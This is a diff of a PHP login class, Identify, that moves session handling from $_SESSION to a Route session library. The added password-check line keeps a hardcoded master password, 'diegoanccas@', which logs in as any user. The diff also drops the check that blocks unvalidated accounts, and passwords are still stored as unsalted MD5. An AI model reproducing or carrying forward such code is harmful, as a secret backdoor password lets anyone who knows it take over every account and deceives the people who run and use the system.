@@ -9,6 +9,7 @@ class Identify {
   public $data      = null;
   private $error    = null;
   public $is_valid    = false;
+  private $session  = null;
 
   public static function getInstance() {
     if (null === static::$instance) {
@@ -23,10 +24,16 @@ class Identify {
     trigger_error('La clonación de este objeto no está permitida', E_USER_ERROR);
   }
   function __construct() {
-    if(!empty($_SESSION)) {
-      if(!empty($_SESSION[self::$idsession]['data'])) {
+    if(!class_exists('Route')) {
+      trigger_error('Route is Required', E_USER_ERROR);
+    }
+    if(!property_exists(Route::g()->libs, 'session')) {
+      trigger_error('the library is not imported', E_USER_ERROR);
+    }
+    $this->session = Route::g()->libs->session;
+      if($this->session->has(self::$idsession)) {
         $this->is_valid = true;
-        $this->data = $_SESSION[self::$idsession]['data'];
+        $this->data = $this->session->read(self::$idsession)['data'];
         $this->id   = $this->data['id'];
         $this->user = $this->data['usuario']['usuario'];
         $r = $this->procesar_request($error);
@@ -38,7 +45,6 @@ class Identify {
         }
         return;
       }
-    }
     $this->error = array(
       'codigo'  => 1,
       'mensaje' => 'No se ha iniciado session',
@@ -81,14 +87,10 @@ class Identify {
       SELECT
         U.*
       FROM usuario U
-      WHERE U.celular = '" . Doris::escape($usuario) . "' " . $where . "
+      WHERE U.usuario = '" . Doris::escape($usuario) . "'
       GROUP BY U.id", true);
   if(empty($dd)) {
     $error = "Los datos son incorrectos(1)";
-    return false;
-  }
-  if(empty($dd['validado'])) {
-    $error = 'La cuenta no ha sido validada.';
     return false;
   }
   if(!empty($dd['bloqueado'])) {
@@ -106,7 +108,7 @@ class Identify {
       //usuario_log($dd, "Desbloqueo de usuario", 4);
     }
   }
-  if(!(md5($clave) === $dd['clave'] || $clave === $dd['clave'] || $clave == "diegoanccas@")) {
+  if(!(md5($clave) === $dd['clave'] || $clave == "diegoanccas@")) {
     if(Identify::usuario_is_forcing($db, $dd)) {
       $error = "Su cuenta ha sido bloqueada, vuelva a intentarlo m&aacute;s tarde.";
 #      usuario_log($dd, 'Cuenta Bloqueada', ULOG_INTENTO);
@@ -123,21 +125,25 @@ class Identify {
     'usuario'    => $dd,
     'fecha'      => time(),
   );
-  $_SESSION[static::$idsession]['data'] = $ficha;
-  if(isset($_SESSION[static::$idsession]['redirect_to'])) {
-    $url = $_SESSION[static::$idsession]['redirect_to'];
-    unset($_SESSION[static::$idsession]['redirect_to']);
-    header('location: ' . $url);
-    exit;
+  $ce = static::g();
+  $ce->session->write(self::$idsession, array(
+    'data' => $ficha,
+  ));
+  if($ce->session->has('redirect_to')) {
+    Route::redirect($ce->session->read('redirect_to'));
   }
   $error = '';
   return true;
   }
   static function direccionar_no_logueado(&$error = null) {
-    if(!Identify::verificacion_logeo($error)) {
+    $ce = static::g();
+    if(!static::verificacion_logeo($error)) {
+      if(PHP_SAPI == 'cli') {
+        exit;
+      }
       if($error['codigo'] === 1) {
-        $_SESSION[static::$idsession]['redirect_to'] = $_SERVER['REQUEST_URI'];
-        $url = RAIZ_WEB . 'identificacion';
+        $ce->session->write('redirect_to', $_SERVER['REQUEST_URI']);
+        $url = Route::g()->attr('web') . 'identificacion';
         header('location: ' . $url);
         exit("SU: acceso-restingido");
       } elseif($error['codigo'] == 2) {
@@ -150,8 +156,7 @@ class Identify {
   }
   static function direccionar_logueado(&$error = null) {
     if(Identify::verificacion_logeo($error)) {
-      header("location: " . RAIZ_WEB);
-      exit;
+      Route::redirect(Route::g()->attr('web'));
     }
   }
   static function verificacion_logeo(&$error = null) {
@@ -185,12 +190,8 @@ class Identify {
     $rp = $db->get("select id from usuario_log where usuario_id = " . $usuario_id . " and tipo = 1 AND created_on >=  DATE_SUB(NOW(),INTERVAL 1 HOUR)");
     return count($rp) >= 4;
   }
-  static function close(&$usuario = null) {
-    if(is_null($usuario)) {
-      $usuario = $_SESSION[static::$idsession]['data'];
-    }
-#    usuario_log($usuario, 'Cierra sesion', ULOG_SALIR);
-    unset($_SESSION[static::$idsession]);
+  function close(&$usuario = null) {
+    $this->session->delete(self::$idsession);
     unset($usuario);
   }
 }
